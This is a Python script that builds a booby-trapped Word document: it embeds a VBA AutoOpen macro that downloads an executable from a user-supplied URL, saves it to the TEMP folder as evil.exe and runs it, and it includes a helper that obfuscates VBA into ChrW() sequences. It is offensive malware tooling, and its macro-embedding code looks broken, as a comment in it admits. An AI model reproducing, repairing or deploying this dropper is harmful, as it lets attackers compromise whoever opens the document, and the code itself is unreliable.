from docx import Document
from docx.oxml import OxmlElement

def obfuscate4me(vba_code):
    obfuscated_code = ""
    for char in vba_code:
        obfuscated_code += "&ChrW(" + str(ord(char)) + ")"
    return obfuscated_code


def add_vba_module(doc, vba_code): #uneedtofixhere
    
    # Add a new embedded MacroPart
    main_part = doc.part
    package = main_part.package
    part = main_part.relate_to('/word/vbaProject.bin', package) 

    # Create the VBA module
    module = OxmlElement("w:binData")
    module.set("{http://schemas.openxmlformats.org/officeDocument/2006/relationships}name", "VBA") 
    #module.set("w:name", "VBA") / w.Name
    # Create a separate element for xml:space and append it to the VBA module
    xml_space = OxmlElement("xml:space")
    xml_space.text = "preserve"
    module.append(xml_space)

    # Set the VBA code as the text content of the VBA module
    module.text = vba_code

    # Append the VBA module to the MacroPart
    part.blob = module 

    # Add the MacroPart to the settings
    doc.settings.element.body.append(part) 


if __name__ == "__main__":
    docx_file_path = input("Enter the path to your Word document (.docx): ")

    download_url = input("Enter the download URL for the exploit: ")

    vba_code = f"""
    Sub AutoOpen()
        Dim downloadURL As String
        downloadURL = "{download_url}"

        Dim savePath As String
        savePath = Environ$("TEMP") & "\\evil.exe"
        Dim http As Object
        Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
        http.Open "GET", downloadURL, False
        http.send
        If http.Status = 200 Then
            Open savePath For Binary As #1
            Put #1, , http.responseBody
            Close #1
        End If

        Shell savePath, vbNormalFocus

        MsgBox "Test", vbInformation
    End Sub
    """

    doc = Document()

    add_vba_module(doc, vba_code)

    file_name_without_extension = ".".join(docx_file_path.split(".")[:-1])

    new_docx_file_path = f"evil-{file_name_without_extension}.docx"
    doc.save(new_docx_file_path)

    print(f"VBA module added and saved as: {new_docx_file_path}")
